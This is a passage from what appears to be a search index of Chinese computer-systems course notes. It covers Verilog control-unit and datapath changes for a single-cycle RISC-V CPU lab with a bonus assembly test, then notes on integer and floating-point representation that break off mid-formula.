; end 7 'b0110111 : begin // lui reg_write = 1 ; mem_to_reg = 2 'b01 ; end 7 'b0110011 : begin // add slt and or sll srl sltu reg_write = 1 ; end 7 'b0010111 : begin // auipc reg_write = 1 ; alu_src_b = 1 ; alu_op = ADD ; auipc = 1 ; end 7 'b1100111 : begin // jalr pc_src = 2 'b01 ; reg_write = 1 ; mem_to_reg = 2 'b10 ; alu_src_b = 1 ; alu_op = ADD ; end endcase end endmodule","title":"\u63a7\u5236\u5355\u5143\u6a21\u5757\u4ee3\u7801"},{"location":"cs/system/cs1/lab5-2/#_6","text":"ImmGen \u6a21\u5757\u5728\u4e0a\u4e00\u6b21 lab \u4e2d\u5c31\u5b9e\u73b0\u4e86\u5bf9\u4e8e\u8fd9 22 \u4e2a\u6307\u4ee4\u7684\u8bc6\u522b\uff0c\u4e0d\u9700\u8981\u66f4\u6539\u3002SCPU \u6a21\u5757\u4e2d\u53ea\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a wire auipc \u7136\u540e\u8fde\u63a5 Control \u548c Datapath \u7684 auipc \u63a5\u53e3\u5373\u53ef\u3002Core \u6a21\u5757\u53ca\u66f4\u9ad8\u5c42\u7684\u65e0\u9700\u66f4\u6539\u3002 \u56e0\u4e3a sll slli srl srli \u8fd9\u4e9b\u79fb\u4f4d\u7684\u6307\u4ee4\u79fb\u7684\u4f4d\u6570\u90fd\u662f\u53d6\u4f4e 5 \u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u6539\u4e00\u4e0b ALU \u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u8fdb\u884c SLL \u548c SRL\uff08\u5305\u62ec SRA\uff09\u65f6\u53d6 b[4:0] \u8fdb\u884c\u8fd0\u7b97\uff0c\u5373\uff1a ... ... SLL: res <= a << b [ 4 : 0 ]; ... SRL: res <= a >> b [ 4 : 0 ]; SRA: res <= a >>> b [ 4 : 0 ]; ... ... Datapath \u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u66f4\u6539\uff1a \u5bf9\u4e8e ALU \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u8fdb\u884c\u4e00\u4e0b\u9009\u62e9\uff0c\u5982\u679c auipc \u4e3a 0 \u5219\u539f\u6837\u9009\u62e9 read_data_1\uff0c\u4e3a 1 \u5219\u9009\u62e9 pc \u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570 PC \u7684\u9009\u62e9\u5668\u8f93\u5165\u5bf9 jal \u548c jalr \u8fdb\u884c\u533a\u5206\uff0cjalr \u5bf9\u5e94\u7684\u5730\u5740\uff08\u5373\u56db\u8def\u9009\u62e9\u5668\u7684\u7b2c\u4e8c\u8def\uff09\u4e3a ALU \u7684\u7ed3\u679c\uff0cjal \u548c branch \u5bf9\u5e94\u7684\u5730\u5740\uff08\u4e09\u56db\u8def\uff09\u4ecd\u4e3a pc+imm \u66f4\u6539\u540e\u7684 Datapath \u6a21\u5757\uff1a `timescale 1 ns / 1 ps module Datapath ( input clk , input rst , input [ 1 : 0 ] pc_src , input reg_write , input alu_src_b , input branch , input b_type , input auipc , input [ 3 : 0 ] alu_op , input [ 1 : 0 ] mem_to_reg , input [ 31 : 0 ] inst_in , input [ 31 : 0 ] data_in , output [ 31 : 0 ] addr_out , output [ 31 : 0 ] data_out , output [ 31 : 0 ] pc_out , input [ 4 : 0 ] debug_reg_addr , output [ 31 : 0 ] debug_reg ); reg [ 31 : 0 ] pc ; wire [ 31 : 0 ] pc_next ; wire [ 31 : 0 ] write_data , read_data_1 , read_data_2 ; wire [ 31 : 0 ] alu_data_1 , alu_data_2 , alu_result ; wire alu_zero ; wire [ 31 : 0 ] imm ; wire [ 31 : 0 ] jal_addr , jalr_addr ; assign pc_out = pc ; assign addr_out = alu_result ; assign data_out = read_data_2 ; always @( posedge clk or posedge rst ) begin if ( rst ) begin pc <= 32 'b0 ; end else begin pc <= pc_next ; end end Regs regs ( . clk ( clk ), . rst ( rst ), . we ( reg_write ), . read_addr_1 ( inst_in [ 19 : 15 ]), . read_addr_2 ( inst_in [ 24 : 20 ]), . write_addr ( inst_in [ 11 : 7 ]), . write_data ( write_data ), . read_data_1 ( read_data_1 ), . read_data_2 ( read_data_2 ), . debug_reg_addr ( debug_reg_addr ), . debug_reg ( debug_reg ) ); ImmGen immgen ( . inst ( inst_in ), . imm ( imm ) ); Mux2x32 mux2x32_1 ( . I0 ( read_data_1 ), . I1 ( pc ), . s ( auipc ), . o ( alu_data_1 ) ); Mux2x32 mux2x32_2 ( . I0 ( read_data_2 ), . I1 ( imm ), . s ( alu_src_b ), . o ( alu_data_2 ) ); ALU alu ( . a ( alu_data_1 ), . b ( alu_data_2 ), . alu_op ( alu_op ), . res ( alu_result ), . zero ( alu_zero ) ); Mux4x32 mux4x32 ( . I0 ( alu_result ), . I1 ( imm ), . I2 ( pc + 4 ), . I3 ( data_in ), . s ( mem_to_reg ), . o ( write_data ) ); assign jal_addr = pc + imm ; assign jalr_addr = alu_result ; MuxPC mux_pc ( . I0 ( pc + 4 ), . I1 ( jalr_addr ), . I2 ( jal_addr ), . I3 ( jal_addr ), . s ( pc_src ), . branch ( branch ), . b_type ( b_type ), . alu_res ( alu_result ), . o ( pc_next ) ); endmodule \u8fd9\u6837\u4fee\u6539\u540e\u6574\u4e2a\u5355\u5468\u671f CPU \u5c31\u5b8c\u6574\u6b63\u786e\u8fde\u63a5\u4e86","title":"\u5176\u5b83\u6587\u4ef6\u4e2d\u7684\u4fee\u6539"},{"location":"cs/system/cs1/lab5-2/#_7","text":"\u4e0e lab5-1 \u540c\u7406\uff0c\u8f7d\u5165 lab10_all.coe \u6587\u4ef6\uff0c\u9009\u62e9 Core_tb.sv \u4e3a\u76ee\u6807\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u518d\u901a\u8fc7\u8c03\u6574\u5f97\u5230\u5168\u90e8\u4e2d\u95f4\u53d8\u91cf\uff08\u5bc4\u5b58\u5668\u7ec4\u503c\u3001ALU \u8f93\u5165\u8f93\u51fa\u3001Mux \u8f93\u5165\u8f93\u51fa\u7b49\uff09\u5f97\u5230\u4eff\u771f\u6ce2\u5f62\uff1a \u4ee5\u53ca pc \u548c\u5bc4\u5b58\u5668\u7684\u6ce2\u5f62\u6570\u636e\uff1a \u901a\u8fc7\u4ed4\u7ec6\u5206\u6790\u6bcf\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\u4e0e\u6240\u6709\u503c\u7684\u53d8\u5316\u3001\u5bc4\u5b58\u5668\u7684\u53d8\u5316\u53ef\u4ee5\u770b\u51fa CPU \u6309\u7167\u7ed9\u51fa\u7684\u6307\u4ee4\u6b63\u786e\u8fd0\u884c\u4e86\u3002\u884c\u4e3a\u5747\u4e0e lab5-1 \u4e00\u81f4\u3002","title":"\u4eff\u771f\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab5-2/#_8","text":"\u5728 vivado \u4e2d disable \u6389 Control_sim.v \u6587\u4ef6\uff08\u5373\u4f7f\u7528 Control.v \u548c Control.edf\uff09\u7136\u540e\u901a\u8fc7 Top.\u200csv \u4e2d\u9876\u5c42\u6a21\u5757\u751f\u6210\u6bd4\u7279\u6d41\uff0c\u5199\u5165 FPGA \u5f00\u53d1\u7248\u5373\u53ef\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1\u3002 \u901a\u8fc7\u5355\u6b65\u8fd0\u884c\uff0c\u89c2\u5bdf pc\u3001inst\u3001\u5bc4\u5b58\u5668\u503c\u53ef\u4ee5\u786e\u5b9a\u4e0a\u677f\u4e5f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002\u884c\u4e3a\u5747\u4e0e lab5-1 \u4e00\u81f4\u3002","title":"\u4e0a\u677f\u9a8c\u8bc1"},{"location":"cs/system/cs1/lab5-2/#bonus","text":"Bonus \u8303\u56f4\u7684\u6307\u4ee4\u5728\u524d\u9762\u8bbe\u8ba1\u63a7\u5236\u5355\u5143\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u8003\u8651\u4e86\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u6d4b\u8bd5\u8fd9\u4e9b\u6307\u4ee4\u5373\u53ef\u3002\u7b80\u5355\u5199\u4e86\u4e00\u4e2a\u5305\u542b\u8fd9\u4e9b\u6307\u4ee4\u7684 RISC-V \u6c47\u7f16\u6587\u4ef6\uff1a .section .text .globl _start _start: addi x1 , x0 , 123 # x1 = 123 andi x2 , x1 , 456 # x2 = 72 ori x3 , x2 , 789 # x3 = 861 and x4 , x3 , x1 # x4 = 89 addi x5 , x0 , 234 # x5 = 234 or x5 , x4 , x5 # x5 = 251 (0xfb) sll x6 , x5 , x2 # x6 = 64256 (0xFB00) xori x7 , x6 , 123 # x7 = 64379 (0xFB7B) slli x8 , x7 , 4 # x8 = 1030064 (0xFB7B0) srli x9 , x8 , 8 # x9 = 4023 (0xFB7) srl x10 , x8 , x2 # x10 = 4023 (0xFB7) auipc x11 , 0xFFF # x11 = 0xFFF02C addi x12 , x0 , -1 # x12 = -1 sltu x12 , x11 , x12 # x12 = 1 jalr x13 , 63 ( x12 ) # x13 = 60 addi x14 , x0 , 1 # won't exec Label: addi x15 , x0 , 1 \u4f7f\u7528 riscv32-unknown-linux-gnu-c++ -nostdlib -nostdinc -static -g bonus.s -o bonus.elf -march=rv32i -mabi=ilp32 \u6765\u7f16\u8bd1\u51fa\u6307\u4ee4\u96c6\u5728 RV32I \u8303\u56f4\u5185\u7684 ELF \u6587\u4ef6\uff0c\u518d objdump\uff1a 00010074 <_start>: 10074: 07b00093 li ra,123 10078: 1c80f113 andi sp,ra,456 1007c: 31516193 ori gp,sp,789 10080: 0011f233 and tp,gp,ra 10084: 0ea00293 li t0,234 10088: 005262b3 or t0,tp,t0 1008c: 00229333 sll t1,t0,sp 10090: 07b34393 xori t2,t1,123 10094: 00439413 slli s0,t2,0x4 10098: 00845493 srli s1,s0,0x8 1009c: 00245533 srl a0,s0,sp 100a0: 00fff597 auipc a1,0xfff 100a4: fff00613 li a2,-1 100a8: 00c5b633 sltu a2,a1,a2 100ac: 03f606e7 jalr a3,63(a2) 100b0: 00100713 li a4,1 000100b4 <Label>: 100b4: 00100793 li a5,1 \u5f97\u5230\u673a\u5668\u7801\uff0c\u5373 coe \u6587\u4ef6\u5185\u5bb9\uff1a memory_initialization_radix = 16; memory_initialization_vector = 07b00093, 1c80f113, 31516193, 0011f233, 0ea00293, 005262b3, 00229333, 07b34393, 00439413, 00845493, 00245533, 00fff597, fff00613, 00c5b633, 03f606e7, 00100713, 00100793; \u8f7d\u5165 ROM \u5185\uff0c\u8fdb\u884c\u4eff\u771f\uff0c\u5f97\u5230\u6ce2\u5f62\u4ee5\u53ca\u5bc4\u5b58\u5668\u5185\u5bb9\u53d8\u5316\uff1a \u901a\u8fc7\u5206\u6790 pc\u3001\u4e2d\u95f4\u503c\u7b49\u4ee5\u53ca\u548c\u6c47\u7f16\u4ee3\u7801\u5b9e\u9645\u6548\u679c\uff08\u6ce8\u91ca\u91cc\u5199\u4e86\uff09\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e9b bonus \u6307\u4ee4\u90fd\u6b63\u5e38\u6267\u884c\u4e86\u3002\u4e0a\u677f\u6d4b\u8bd5\u4e5f\u6ca1\u6709\u95ee\u9898\u3002","title":"Bonus"},{"location":"cs/system/cs1/lab5-2/#cpu_1","text":"\u5b9e\u9645\u4f7f\u7528\u7684\u5355\u5468\u671f CPU \u8bbe\u8ba1\u56fe\u5982\u4e0b\uff1a","title":"\u9644\uff1a\u5355\u5468\u671f CPU \u8bbe\u8ba1\u56fe"},{"location":"cs/system/cs1/topic1/","text":"\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.) Chapter 2: Representing and Manipulating Information \u6574\u6570\u8868\u793a\u6cd5 \u00b6 \u65e0\u7b26\u53f7\u6574\u578b \u00b6 \u65e0\u7b26\u53f7\u6574\u578b\u4e00\u822c\u76f4\u63a5\u4f7f\u7528\u5176\u4e8c\u8fdb\u5236\uff08\u539f\u7801\uff09\u6765\u8868 \u6bd4\u5982\u6709\u4e00\u4e2a \\(w\\) \u4f4d\u7684\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5219\u5c06\u5176\u8f6c\u5316\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\uff1a \\[ B2U_w(\\overrightarrow{x}) = \\sum_{i=0}^{w-1}x_i2^i \\] \u53ef\u4ee5\u77e5\u9053 B2U \u662f\u4e00\u4e2a\u53cc\u5c04 \u540c\u65f6\u4e5f\u5bb9\u6613\u77e5\u9053\u65e0\u7b26\u53f7\u6574\u578b\u53ef\u8868\u793a\u7684\u6700\u5927\u503c\u4e3a \\(UMax_{w}=\\displaystyle\\sum_{i=0}^{w-1}2^i=2^w-1\\) \u6709\u7b26\u53f7\u6574\u578b\u8865\u7801\u8868\u793a \u00b6 \u6700\u5e38\u7528\u7684\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u65b9\u6cd5\u662f\u8865\u7801\uff08Two's-Complement\uff09 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u8865\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2T_w(\\overrightarrow{x}) = -x_{w-1}2^{w-1} + \\sum_{i=0}^{w-2}x_i2^i \\] \u5b83\u7684\u6700\u9ad8\u4f4d\uff08MSB\uff09\u662f\u7b26\u53f7\u4f4d\uff0c\u5982\u679c\u662f 1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u662f\u6b63\u6570 \u5e76\u4e14\u5bf9\u4e8e\u6b63\u6570\uff0c\u5b83\u5bf9\u5e94\u7684\u6bd4\u7279\u5e8f\u5217\u5c31\u662f\u5176\u4e8c\u8fdb\u5236 \u800c\u5bf9\u4e8e\u8d1f\u6570\uff0c\u5219\u4f7f\u7528\u8865\u7801\uff0c\u5373 \\(-x = \\sim x + 1 (x > 0)\\) \u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5b9e\u9645\u4e0a\u5c31\u662f\u6539\u53d8\u4e86 MSB \u7684\u6743\u91cd\uff0c\u4ece \\(2^{w-1}\\) \u6539\u4e3a\u4e86 \\(-2^{w-1}\\) \u540c\u65f6\u4e5f\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8865\u7801\u53ef\u4ee5\u8868\u793a\u7684\u8303\u56f4 \\(TMin_w=-2^{w-1}\\) \uff0c \\(TMax_w=2^{w-1}-1\\) \u6709\u7b26\u53f7\u6574\u578b\u53cd\u7801\u8868\u793a \u00b6 \u53cd\u7801\uff08Ones' complement\uff09\u4e5f\u662f\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u5e38\u7528 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u53cd\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2O_w(\\overrightarrow{x}) = -x_{w-1}(2^{w-1}-1) + \\sum_{i=0}^{w-2}x_i2^i \\] \u76f8\u8f83\u4e8e\u8865\u7801\uff0c\u5b83\u4eec\u5728\u6b63\u6570\u4e0a\u662f\u4e00\u6837\u7684 \u4f46\u662f\u5bf9\u4e8e\u8d1f\u6570\uff0c\u53cd\u7801\u8868\u793a\u4e0b\u662f \\(-x = \\sim x (x > 0)\\) \u5728\u53e6\u4e00\u4e2a\u89d2\u5ea6\uff0c\u5b83\u7684 MSB \u7684\u6743\u91cd\u662f \\(2^{w-1}-1\\) \u5b83\u7684\u7f3a\u70b9\u662f 0 \u6709\u4e24\u79cd\u8868\u793a\uff0c\u5373 +0 [00...0] \u548c -0 [11...1] \u65e0\u7b26\u53f7\u4e0e\u6709\u7b26\u53f7\u8f6c\u6362 \u00b6 C \u8bed\u8a00\u4e2d\u5f3a\u5236\u8f6c\u6362\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u6574\u578b\u5e76\u4e0d\u6539\u53d8\u6bd4\u7279\u5e8f\u5217\uff0c\u800c\u662f\u6539\u53d8\u8bfb\u53d6\u7684\u65b9\u5f0f \u5373\u4ece\u6709\u7b26\u53f7\u8f6c\u4e3a\u65e0\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u539f\u7801\u6765\u89e3\u8bfb\u539f\u6765\u8865\u7801\u7684\u4e8c\u8fdb\u5236 \u4ece\u65e0\u7b26\u53f7\u8f6c\u4e3a\u6709\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u8865\u7801\u89e3\u8bfb\u539f\u6765\u539f\u7801\u7684\u4e8c\u8fdb\u5236 \\[ T2U_w(x) = B2U_w(T2B_w(x)) \\] \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u539f\u7801\u548c\u8865\u7801\u53ea\u5dee\u4e86 MSB \u7684\u6743\u91cd\u4ece\u6b63\u5230\u8d1f\uff0c\u6240\u4ee5 \\(T2U_w(x) = x + x_{w-1}2^w\\) \uff0c\u4e5f\u5c31\u662f\uff1a \\[ T2U_w(x) = \\begin{cases}x+2^w, &x<0\\\\x, &x\\geq 0\\end{cases} \\] \u5bf9\u4e8e\u65e0\u7b26\u53f7\u8f6c\u6709\u7b26\u53f7\uff1a \\[ U2T_w(x) = B2T_w(U2B_w(x)) \\] \u540c\u65f6\uff1a \\[ U2T_w(x) = \\begin{cases}x, &x\\leq TMax_w=2^{w-1}-1\\\\x-2^w, &x > TMax_w=2^{w-1}-1\\end{cases} \\] \u6574\u6570\u8fd0\u7b97 \u00b6 \u65e0\u7b26\u53f7\u6574\u578b\u52a0\u6cd5 \u00b6 \u5bf9\u4e8e\u4e24\u4e2a\u65e0\u7b26\u53f7\u6574\u578b \\(x, y\\in[0, 2^w)\\) \uff0c\u5b83\u4eec\u505a\u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u5728 \\(w+1\\) \u4f4d\u4e0b\u624d\u80fd\u5b8c\u5168\u8868\u793a\u51fa\u6765 \u4f46\u662f\u7ed3\u679c\u4e00\u5b9a\u8fd8\u8981\u8868\u793a\u5728 \\(w\\) \u4f4d\u4e0b\u8868\u793a\uff0c\u8fd9\u65f6\u5c31\u8981\u5bf9\u6ea2\u51fa\u90e8\u5206\u622a\u65ad\uff0c\u5373\u76f4\u63a5\u53bb\u6389\u6700\u9ad8\u4f4d \\[ x+_w^\\mathrm{u}y = (x+y)\\bmod{2^w} \\] \u5373\uff1a \\[ x+_w^\\mathrm{u}y = \\begin{cases} x + y, &x + y < 2^w\\quad \\text{Normal}\\\\ x + y - 2^w, &2^w\\leq x + y < 2^{w + 1}\\quad \\text{Overflow} \\end{cases} \\] \u65e0\u7b26\u53f7\u6574\u578b\u51cf\u6cd5 \u00b6 \u51cf\u6cd5\u5373\u52a0\u4e0a\u51cf\u6570\u53d6\u8d1f\uff0c\u6240\u4ee5\u53ea\u8981\u77e5\u9053\u5982\u4f55\u53d6\u8d1f\u5373\u53ef \u5bf9\u4e8e 0\uff0c\u53d6\u8d1f\u540e\u4e00\u5b9a\u4e5f\u4e3a 0 \u800c\u5bf9\u4e8e\u975e 0 \u6570\uff0c\u56e0\u4e3a\u53d6\u8d1f\u540e\u52a0\u4e0a\u539f\u6570\u4e3a 0\uff08 \\(2^w\\) \u622a\u65ad\u540e\uff09\uff0c\u6240\u4ee5\u53d6\u8d1f\u5373\u7528 \\(2^w\\) \u51cf\u53bb\u539f\u6570\uff1a \\[ -_w^\\mathrm{u}x = \\begin{cases}x, &x=0\\\\2^w-x, &x>0\\end{cases} \\] \u8865\u7801\u8868\u793a\u4e2d\u52a0\u6cd5 \u00b6 \u4f7f\u7528\u8865\u7801\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u8fdb\u884c\u52a0\u6cd5\u65f6\uff0c\u4f1a\u9047\u5230\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5927\uff0c\u8d85\u8fc7 \\(2^{w-1} - 1\\) \uff0c\u6b63\u6ea2\u51fa\uff08Positive overflow\uff09 \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5c0f\uff0c\u5c0f\u4e8e \\(-2^{w-1}\\) \uff0c\u8d1f\u6ea2\u51fa\uff08Negative overflow\uff09 \u6240\u4ee5\u4e5f\u9700\u8981\u5bf9\u7ed3\u679c\u8fdb\u884c\u622a\u65ad\u5904\u7406\uff1a \\[ x+_w^\\mathrm{t}y = \\begin{cases} x+y-2^w, & 2^{w-1}\\leq x + y \\quad \\text{Positive overflow}\\\\ x+y, &-2^{w-1}\\leq x+y < 2^{w-1}\\quad \\text{Normal}\\\\ x+y+2^w, &x+y < -2^{w-1}\\quad \\text{Negative overflow} \\end{cases} \\] \u4ece\u6bd4\u7279\u5e8f\u5217\u89d2\u5ea6\u6765\u770b\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u89c6\u4e3a\u4e8c\u8fdb\u5236\u5e8f\u5217\u76f8\u52a0\uff0c\u518d\u8f6c\u56de\u8865\u7801\u8868\u793a\u7684\u503c\uff1a \\[ x+_w^\\mathrm{t}y=U2T_w(T2U_w(x)+_w^\\mathrm{u}T2U_w(y)) \\] \u8865\u7801\u8868\u793a\u4e2d\u7684\u51cf\u6cd5 \u00b6 \u540c\u6837\uff0c\u4e5f\u662f\u53ea\u8003\u8651\u53d6\u8d1f\u5373\u53ef \u4f46\u662f\u548c\u539f\u7801\u4e0d\u540c\uff0c\u5b83\u672c\u8eab\u5c31\u5e26\u6b63\u8d1f\uff0c\u6240\u4ee5\u53d6\u8d1f\u5219\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\uff08\u5373\u53d6\u53cd\u52a0\u4e00\uff09 \u4f46\u6709\u4e00\u4e2a\u7279\u6b8a\uff0c\u4e5f\u5c31\u662f\u6700\u5c0f\u7684 \\(-2^{w-1}\\) \uff0c\u8d1f\u7684\u5b83 \\(2^{w-1}\\) \u5e76\u4e0d\u5728\u8865\u7801\u7684\u8303\u56f4\u4e2d \u800c \\(TMin_w+_w^\\mathrm{t}TMin_w=-2^{w-1}-2^{w-1}=-2^w\\) \uff0c\u622a\u65ad\u540e\u6070\u597d\u4e3a 0 \u6240\u4ee5 \\(-TMin_w = TMin_w\\) \uff0c\u5373\uff1a \\[ -_w^\\mathrm{t}x = \\begin{cases} -2^{w-1}, &x = -2^{w-1}\\\\ -x, &x > -2^{w-1} \\end{cases} \\] \u4e58\u6cd5 \u00b6 \u6574\u578b\u7684\u4e58\u6cd5\u5747\u662f\u76f4\u63a5\u5c06\u539f\u7801/\u8865\u7801\u7684\u4e8c\u8fdb\u5236\u76f8\u4e58\uff0c\u7136\u540e\u76f4\u63a5\u622a\u65ad\u81f3 \\(w\\) \u4f4d \\[ x*_w^\\mathrm{t}y = U2T_w(x*_w^\\mathrm{u}y) = U2T_w(x*y\\bmod 2^w) \\] \u5e76\u4e14\u4e58\u4ee5\u5e38\u6570\u53ef\u4ee5\u901a\u8fc7\u79fb\u4f4d\u6765\u8fdb\u884c\uff0c\u6bd4\u5982\uff1a x * 2 k = x < < k x * 14 = (x < < 3) + (x < < 2) + (x < < 1) \u9664\u4ee5\u4e8c\u7684\u5e42\u6b21 \u00b6 Unsigned \u00b6 \u65e0\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\u5219\u76f4\u63a5\u8fdb\u884c\u53f3\u79fb\uff1a x / 2 k = x >> k \u5e76\u4e14\u662f\u5411\u4e0b\u53d6\u6574 Signed \u00b6 \u8865\u7801\u8868\u793a\u7684\u6709\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\uff0c\u8fdb\u884c\u6570\u503c\u53f3\u79fb\uff0c\u4f46\u662f\u76f4\u63a5\u53f3\u79fb\u8fdb\u884c\u7684\u662f\u5411\u4e0b\u53d6\u6574 \u800c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6574\u578b\u9664\u6cd5\u4e00\u822c\u8981\u5411 0 \u53d6\u6574\uff0c\u6240\u4ee5\u5bf9\u4e8e\u8d1f\u6570\u8981\u5411\u4e0a\u53d6\u6574 \u5411\u4e0a\u53d6\u6574\u8981\u5148\u52a0\u4e0a\u4e00\u4e2a bias \u7136\u540e\u518d\u53f3\u79fb\uff0cbias = 2 k - 1\uff0c\u5373 x / 2 k \u5411\u4e0a\u53d6\u6574\u8981\u8fdb\u884c (x + (1 << k) - 1) >> k \u6240\u4ee5\u5411 0 \u53d6\u6574\uff1a (x < 0 ? (x + (1 < < k) - 1) : x) >> k \u6d6e\u70b9\u6570\u8868\u793a\u6cd5 \u00b6 \u524d\u9762\u7684\u6574\u578b\u90fd\u662f\u4e00\u79cd\u5b9a\u70b9\u6570\uff08fixed point\uff09\uff0c\u5373\u5c0f\u6570\u70b9\u7684\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff08\u56fa\u5b9a\u5728\u672b\u5c3e\uff09\uff0c\u5b83\u7684\u7f3a\u70b9\u662f\u8303\u56f4\u56fa\u5b9a \u800c\u6d6e\u70b9\u6570\uff08floating point\uff09\u7684\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5219\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u4f7f\u7528 \\(x*2^y\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\u4e00\u4e2a\u6570 \u4e5f\u56e0\u6b64\u53ef\u4ee5\u8868\u793a\u5f88\u5927\u6216\u8005\u5f88\u5c0f\u7684\u6570 \u5e38\u7528\u7684\u6d6e\u70b9\u6570\u8868\u793a\u65b9\u6cd5\u662f\u7531 IEEE 754 \u6807\u51c6\u6307\u5b9a\u7684 IEEE \u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u90fd\u901a\u8fc7 \\(V=(-1)^s\\times M\\times 2^E\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\uff0c\u5176\u4e2d\uff1a \\(s\\) \uff1a\u7b26\u53f7\uff08sign\uff09\uff0c1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u8868\u793a\u662f\u6b63\u6570 \\(M\\) \uff1a\u5c3e\u6570\uff08mantissa\uff09\u6216\u79f0\u6709\u6548\u6570\u5b57\uff08significand\uff09 \\(E\\) \uff1a\u6307\u6570\uff08exponent\uff09 \u5b83\u4eec\u7684\u5b58\u50a8\u65b9\u5f0f\u662f\uff1a \u6700\u9ad8\u4f4d\u6bd4\u7279\u8868\u793a \\(s\\) \u540e\u63a5 \\(k\\) \u6bd4\u7279 \\([e_{k-1}\\cdots e_1e_0]\\) \u6307\u6570\u90e8\u5206\uff08\u4e5f\u79f0\u4e3a\u9636\u7801\uff09\u7f16\u7801\u4e86 \\(E\\) \u6700\u540e\u662f \\(n\\) \u4e2a\u6bd4\u7279 \\([f_{n-1}\\cdots f_1f_0]\\) \u5206\u6570\u90e8\u5206\uff0c\u7f16\u7801\u4e86 \\(M\\) \u5e76\u4e14\u6709\u4e24\u79cd\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u5373\uff1a \u5355\u7cbe\u5ea6\uff08single-precision floating-point\uff09\uff0c \\(k=8\\) \uff0c \\(n=23\\) \uff0c32 \u4f4d\uff084 \u5b57\u8282\uff09\u5b58\u50a8 \u53cc\u7cbe\u5ea6\uff08double-precision floating-point\uff09\uff0c \\(k=11\\) \uff0c \\(n=52\\) \uff0c64 \u4f4d\uff088 \u5b57\u8282\uff09\u5b58\u50a8 IEEE \u6d6e\u70b9\u6570\u503c\u8fd8\u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u4e0b\u9762\u5206\u522b\u63cf\u8ff0 \u89c4\u7ea6\u5f62\u5f0f \u00b6 \u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684\u9636\u7801\u4e0d\u5168\u4e3a 0 \u4e5f\u4e0d\u5168\u4e3a 1\uff0c\u662f\u6700\u5e38\u89c1\u7684\u5f62\u5f0f \u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c\u800c \\(E\\) \u3001 \\(M\\) \u7684\u89c4\u5219\uff1a \\(E\\) \u901a\u8fc7 \u79fb\u7801 \uff08biased\uff09\u8868\u793a\u6210 \u9636\u7801 \\([e_{k-1}\\cdots e_1e_0]\\) \uff0c\u79fb\u4f4d \\(Bias = 2^{k-1}-1\\) \uff0c \\(E = e - Bias\\) \uff08\u5176\u4e2d \\(e\\) \u4e3a\u5c06\u9636\u7801\u8f6c\u4e3a\u65e0\u7b26\u53f7\u6574\u578b\u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u9636\u7801\u90e8\u5206\u8303\u56f4\u4ece \\([1, 2^k-2]\\) \u53d8\u4e3a \\([-2^{k-1}+2, 2^{k-1}-1]\\) \\(M = 1+f\\) 